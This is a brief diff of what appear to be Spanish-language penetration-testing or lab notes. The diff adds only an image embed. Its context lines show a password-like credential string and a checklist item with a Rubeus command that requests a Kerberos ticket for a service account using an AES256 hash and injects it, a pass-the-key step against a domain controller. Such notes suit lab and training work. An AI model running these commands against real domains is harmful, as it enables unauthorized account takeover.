@@ -69,3 +69,5 @@ P@ssS3cretforuservirtualmachineAdm!nthatitisnotguessable!
 ### Añadir los hashes a la maquina de atacante CMD system32
 - [ ] `.\Rubeus.exe asktgt /user:techservice /aes256:<hash> /domain:tech.corp /dc:172.16.4.5:88 /show /ptt`
 
+![[Pasted image 20260727161736.png]]
+
